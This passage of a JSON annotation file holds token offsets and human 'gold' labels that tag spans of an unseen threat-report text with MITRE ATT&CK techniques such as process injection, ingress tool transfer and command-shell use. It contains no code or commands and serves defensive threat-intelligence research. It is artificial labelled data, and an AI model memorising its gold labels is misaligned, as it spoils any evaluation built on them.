24650], [24651, 24660], [24661, 24670], [24671, 24675], [24676, 24689], [24690, 24698], [24699, 24704], [24705, 24708], [24708, 24709], [24710, 24716], [24717, 24726], [24726, 24727], [24727, 24729], [24730, 24732], [24733, 24735], [24736, 24738], [24739, 24741], [24742, 24753], [24754, 24756], [24757, 24758], [24759, 24760], [24760, 24782], [24782, 24783], [24783, 24786], [24787, 24789], [24790, 24807], [24807, 24808], [24808, 24811], [24812, 24814], [24815, 24828], [24829, 24840], [24841, 24851], [24852, 24855], [24856, 24862], [24863, 24870], [24871, 24872], [24873, 24879], [24880, 24883], [24884, 24888], [24889, 24900], [24901, 24903], [24904, 24911], [24911, 24912], [24914, 24916], [24917, 24923], [24924, 24926], [24927, 24932], [24933, 24937], [24938, 24942], [24943, 24949], [24950, 24959], [24960, 24964], [24965, 24970], [24971, 24977], [24978, 24980], [24981, 24991], [24991, 24992], [24993, 24996], [24997, 24999], [25000, 25004], [25005, 25007], [25008, 25018], [25019, 25021], [25022, 25032], [25033, 25036], [25037, 25041], [25042, 25050], [25050, 25051], [25052, 25054], [25055, 25062], [25063, 25074], [25075, 25083], [25083, 25084], [25085, 25087], [25088, 25091], [25092, 25098], [25099, 25100], [25101, 25107], [25108, 25119], [25120, 25128], [25129, 25133], [25134, 25144], [25145, 25148], [25149, 25153], [25154, 25156], [25157, 25165], [25166, 25171], [25172, 25180], [25181, 25185], [25186, 25189], [25190, 25198], [25199, 25207], [25207, 25208], [25209, 25211], [25212, 25222], [25223, 25232], [25232, 25233], [25236, 25246], [25247, 25249], [25250, 25259], [25260, 25270], [25271, 25273], [25274, 25283], [25284, 25286], [25287, 25288], [25289, 25298], [25299, 25303], [25304, 25306], [25307, 25314], [25315, 25317], [25318, 25326], [25327, 25336], [25337, 25339], [25340, 25346], [25347, 25348], [25349, 25357], [25358, 25368], [25369, 25370], [25370, 25372], [25372, 25373], [25374, 25378], [25379, 25387], [25388, 25392], [25393, 25396], [25397, 25403], [25404, 25406], [25407, 25408], [25409, 25416], [25417, 25424], [25425, 25432], [25433, 25436], [25437, 25441], [25442, 25445], [25446, 25453], [25454, 25457], [25458, 25462], [25463, 25465], [25466, 25470], [25470, 25471], [25472, 25478], [25479, 25490], [25491, 25500], [25501, 25508], [25508, 25509], [25510, 25515], [25516, 25523], [25524, 25531], [25532, 25534], [25535, 25543], [25544, 25547], [25548, 25550], [25551, 25560], [25561, 25565], [25566, 25570], [25571, 25574], [25575, 25581], [25582, 25589], [25589, 25590], [25591, 25601], [25602, 25604], [25605, 25614], [25615, 25621], [25622, 25625], [25626, 25633], [25634, 25636], [25637, 25641], [25642, 25645], [25646, 25653], [25654, 25657], [25658, 25662], [25663, 25671], [25672, 25676], [25677, 25683], [25683, 25684], [25685, 25688], [25689, 25693], [25694, 25706], [25707, 25713], [25714, 25716], [25717, 25720], [25721, 25728], [25729, 25731], [25732, 25735], [25736, 25744], [25745, 25749], [25750, 25752], [25753, 25760], [25761, 25765], [25766, 25772], [25773, 25776], [25777, 25784], [25785, 25794], [25795, 25805], [25806, 25808], [25809, 25816], [25817, 25823], [25824, 25827], [25828, 25837], [25838, 25844], [25845, 25850], [25850, 25851], [25852, 25856], [25857, 25866], [25867, 25869], [25870, 25875], [25876, 25884], [25885, 25887], [25888, 25894], [25895, 25903], [25904, 25914], [25915, 25919], [25920, 25927], [25928, 25930], [25931, 25936], [25937, 25945], [25946, 25949], [25950, 25957], [25958, 25960], [25961, 25965], [25966, 25975], [25975, 25976], [25977, 25979], [25980, 25990], [25991, 25993], [25994, 26003], [26003, 26004], [26005, 26008], [26009, 26011], [26012, 26016], [26017, 26019], [26020, 26026], [26027, 26030], [26031, 26034], [26035, 26043], [26044, 26047], [26048, 26061], [26062, 26064], [26065, 26068], [26069, 26075], [26076, 26085], [26086, 26092], [26092, 26093], [26094, 26097], [26098, 26107], [26108, 26112], [26113, 26123], [26123, 26124], [26125, 26129], [26130, 26132], [26133, 26140], [26141, 26144], [26145, 26151], [26152, 26158], [26158, 26159], [26160, 26163], [26164, 26177], [26178, 26180], [26181, 26185], [26185, 26186], [26187, 26189], [26190, 26195], [26196, 26198], [26198, 26199], [26200, 26203], [26204, 26212], [26213, 26217], [26218, 26221], [26222, 26228], [26229, 26231], [26232, 26233], [26234, 26244], [26245, 26249], [26250, 26252], [26253, 26256], [26257, 26264], [26264, 26265], [26266, 26272], [26273, 26275], [26276, 26280], [26281, 26290], [26291, 26293], [26294, 26300], [26301, 26304], [26305, 26312], [26312, 26313], [26314, 26318], [26319, 26322], [26323, 26325], [26326, 26330], [26331, 26333], [26334, 26342], [26343, 26346], [26347, 26360], [26361, 26363], [26364, 26370], [26370, 26371], [26372, 26375], [26376, 26385], [26386, 26390], [26391, 26394], [26395, 26397], [26398, 26408], [26409, 26411], [26412, 26415], [26416, 26424], [26425, 26429], [26429, 26430], [26431, 26439], [26440, 26443], [26444, 26451], [26452, 26454], [26455, 26462], [26463, 26469], [26470, 26473], [26474, 26481], [26482, 26484], [26485, 26488], [26489, 26500], [26501, 26508], [26508, 26509], [26510, 26514], [26515, 26524], [26525, 26533], [26534, 26541], [26542, 26552], [26553, 26555], [26556, 26565], [26565, 26566], [26567, 26576], [26577, 26589], [26589, 26590], [26591, 26602], [26602, 26603], [26604, 26607], [26608, 26611], [26612, 26619], [26620, 26622], [26623, 26631], [26632, 26635], [26636, 26646], [26647, 26650], [26651, 26660], [26661, 26663], [26664, 26667], [26668, 26679], [26680, 26687], [26687, 26688], [26689, 26700], [26701, 26705], [26706, 26713], [26714, 26715], [26716, 26722], [26723, 26729], [26730, 26737], [26737, 26759], [26759, 26760], [26761, 26765], [26766, 26777], [26778, 26788], [26789, 26791], [26792, 26801], [26802, 26807], [26808, 26818], [26818, 26819], [26820, 26824], [26825, 26831], [26832, 26838], [26839, 26842], [26843, 26852], [26853, 26855], [26856, 26857], [26858, 26860], [26861, 26865], [26866, 26870], [26871, 26872], [26873, 26879], [26880, 26882], [26883, 26888], [26889, 26898], [26899, 26905], [26906, 26913], [26914, 26921], [26922, 26924], [26925, 26927], [26928, 26932], [26932, 26933], [26934, 26937], [26938, 26943], [26944, 26945], [26946, 26956], [26957, 26960], [26961, 26972], [26973, 26977], [26977, 26978], [26979, 26981], [26982, 26985], [26986, 26992], [26993, 27004], [27005, 27014], [27015, 27019], [27020, 27028], [27029, 27036], [27037, 27040], [27041, 27053], [27053, 27054], [27055, 27064], [27065, 27068], [27069, 27080], [27081, 27085], [27086, 27095], [27096, 27097], [27097, 27101], [27101, 27103], [27104, 27106], [27107, 27108], [27109, 27115], [27115, 27116], [27117, 27121], [27122, 27125], [27126, 27132], [27133, 27145], [27146, 27151], [27152, 27154], [27155, 27164], [27165, 27168], [27169, 27177], [27178, 27181], [27182, 27187], [27188, 27190], [27191, 27204], [27205, 27212], [27213, 27216], [27217, 27227], [27228, 27231], [27232, 27237], [27238, 27244], [27245, 27250], [27250, 27251], [27252, 27255], [27256, 27261], [27262, 27265], [27266, 27269], [27270, 27272], [27273, 27279], [27280, 27284], [27284, 27285], [27286, 27296], [27297, 27303], [27304, 27308], [27309, 27337], [27338, 27339], [27339, 27349], [27350, 27356], [27356, 27357], [27357, 27360], [27360, 27361], [27361, 27370], [27370, 27372], [27372, 27386], [27386, 27388], [27388, 27393], [27393, 27396], [27396, 27403], [27403, 27404], [27404, 27407], [27407, 27408], [27408, 27429], [27429, 27430], [27430, 27433], [27433, 27435], [27436, 27437], [27438, 27441], [27442, 27452], [27453, 27454], [27455, 27456], [27456, 27461], [27461, 27464], [27464, 27474], [27474, 27475], [27475, 27478], [27478, 27479], [27479, 27486], [27486, 27487], [27487, 27495], [27495, 27496], [27496, 27499], [27499, 27500], [27501, 27511], [27512, 27513], [27514, 27524], [27525, 27531], [27531, 27532], [27532, 27535], [27535, 27536], [27536, 27545], [27546, 27554], [27555, 27556], [27557, 27567], [27567, 27568], [27568, 27580], [27580, 27581], [27581, 27591], [27591, 27592], [27593, 27621], [27622, 27630], [27631, 27639], [27640, 27642], [27643, 27646], [27647, 27651], [27652, 27656], [27657, 27663], [27664, 27673], [27674, 27677], [27678, 27682], [27683, 27686], [27687, 27689], [27690, 27697], [27698, 27700], [27701, 27702], [27703, 27708], [27709, 27717], [27718, 27722], [27722, 27723], [27724, 27734], [27735, 27739], [27740, 27745], [27746, 27752], [27753, 27755], [27756, 27758], [27758, 27768], [27769, 27775], [27775, 27776], [27776, 27779], [27779, 27780], [27780, 27789], [27789, 27791], [27791, 27805], [27805, 27807], [27807, 27812], [27812, 27815], [27815, 27825], [27825, 27826], [27826, 27829], [27829, 27830], [27830, 27837], [27837, 27838], [27838, 27843], [27843, 27844], [27844, 27847], [27847, 27849], [27850, 27851], [27852, 27855], [27855, 27856], [27857, 27859], [27860, 27864], [27865, 27868], [27868, 27869], [27870, 27872], [27873, 27876], [27877, 27885], [27886, 27889], [27890, 27893], [27894, 27904], [27905, 27907], [27908, 27911], [27912, 27918], [27919, 27921], [27922, 27923], [27924, 27931], [27932, 27939], [27940, 27947], [27948, 27951], [27952, 27956], [27957, 27959], [27960, 27965], [27966, 27969], [27970, 27974], [27975, 27977], [27978, 27982], [27982, 27983], [27984, 27991], [27992, 27996], [27997, 28001], [28002, 28003], [28003, 28014], [28015, 28019], [28020, 28029], [28029, 28030], [28031, 28033], [28034, 28043], [28043, 28044], [28045, 28047], [28048, 28052], [28053, 28058], [28059, 28061], [28061, 28062], [28063, 28065], [28066, 28075], [28076, 28082], [28082, 28083], [28084, 28094], [28095, 28098], [28099, 28104], [28105, 28109], [28110, 28112], [28113, 28117], [28118, 28125], [28126, 28135], [28136, 28140], [28140, 28141], [28142, 28149], [28149, 28150], [28151, 28154], [28155, 28166], [28167, 28174], [28175, 28178], [28179, 28183], [28183, 28184], [28185, 28187], [28188, 28191], [28192, 28196], [28197, 28205], [28206, 28213], [28213, 28214], [28215, 28217], [28218, 28222], [28223, 28227], [28228, 28232], [28233, 28237], [28238, 28241], [28242, 28253], [28254, 28256], [28257, 28266], [28267, 28271], [28271, 28272], [28273, 28283], [28284, 28292], [28293, 28303], [28304, 28307], [28308, 28315], [28316, 28320], [28321, 28325], [28326, 28333], [28334, 28336], [28337, 28339], [28340, 28345], [28346, 28348], [28348, 28349], [28350, 28352], [28353, 28357], [28358, 28362], [28363, 28370], [28371, 28383], [28384, 28399], [28400, 28402], [28403, 28410], [28411, 28414], [28415, 28424], [28425, 28437], [28437, 28438], [28439, 28447], [28447, 28448], [28449, 28454], [28455, 28460], [28461, 28465], [28466, 28467], [28468, 28472], [28473, 28478], [28479, 28481], [28482, 28490], [28491, 28497], [28497, 28498], [28499, 28508], [28508, 28509], [28510, 28520], [28521, 28532], [28533, 28535], [28536, 28545], [28546, 28555], [28556, 28564], [28565, 28568], [28569, 28577], [28578, 28584], [28585, 28587], [28588, 28599], [28600, 28607], [28607, 28608], [28609, 28618], [28619, 28627], [28628, 28640], [28641, 28651], [28651, 28652], [28653, 28661], [28662, 28665], [28666, 28672], [28673, 28681], [28682, 28684], [28685, 28694], [28695, 28699], [28700, 28704], [28705, 28711], [28712, 28724], [28724, 28725], [28726, 28734], [28735, 28738], [28739, 28746], [28747, 28750], [28751, 28758], [28759, 28760], [28760, 28762], [28762, 28763], [28764, 28770], [28770, 28771], [28772, 28781], [28782, 28785], [28786, 28791], [28792, 28795], [28796, 28807], [28808, 28817], [28818, 28831], [28832, 28840], [28840, 28841], [28842, 28848], [28849, 28858], [28859, 28863], [28863, 28864], [28865, 28868], [28869, 28872], [28873, 28875], [28876, 28879], [28880, 28892], [28893, 28894], [28896, 28901], [28902, 28905], [28906, 28909], [28910, 28917], [28917, 28918], [28919, 28929], [28964, 28969], [28991, 28992], [28993, 28994], [28995, 28996], [29027, 29030], [29052, 29053], [29054, 29055], [29056, 29057], [29088, 29095], [29117, 29118], [29119, 29122], [29123, 29124], [29155, 29161], [29183, 29184], [29185, 29186], [29187, 29188], [29194, 29199], [29201, 29202], [29203, 29204], [29205, 29206], [29212, 29220], [29222, 29223], [29224, 29225], [29226, 29227]]}, {"type": "SEGMENT", "hasID": false, "hasSpan": true, "attrs": [{"name": "annotator", "type": "string", "aggregation": null}, {"name": "set", "type": "string", "aggregation": null}, {"name": "status", "type": "string", "aggregation": null}], "annots": [[0, 29228, "jlasky", "content", "human gold"]]}, {"type": "System Information Discovery (T1082)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[6469, 6541], [7121, 7212], [7216, 7298]]}, {"type": "Portable Executable Injection (T1055.002)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[25236, 25259], [25260, 25470], [25591, 25683], [25977, 26093], [26737, 26819], [26820, 26932], [26314, 26509], [25209, 25233]]}, {"type": "Ingress Tool Transfer (T1105)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[24993, 25051], [21761, 21903], [21380, 21406], [20931, 20998], [19090, 19179], [18947, 19065], [19295, 19352]]}, {"type": "Windows Command Shell (T1059.003)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[22151, 22253], [22043, 22123]]}, {"type": "Deobfuscate/Decode Files or Information (T1140)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[19874, 19881], [11330, 11383], [11255, 11328], [13235, 13291], [13353, 13406], [13606, 13722]]}, {"type": "File Deletion (T1070.004)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[20472, 20496]]}, {"type": "Native API (T1106)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[17696, 17718], [7213, 7263]]}, {"type": "Symmetric Cryptography (T1573.001)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[11445, 11554], [11630, 11738]]}, {"type": "System Network Configuration Discovery (T1016)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[5789, 5873]]}, {"type": "Obfuscated Files or Information (T1027)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[15284, 15338]]}, {"type": "Process Injection (T1055)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[26200, 26217]]}, {"type": "DLL Side-Loading (T1574.002)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": []}], "version": 2}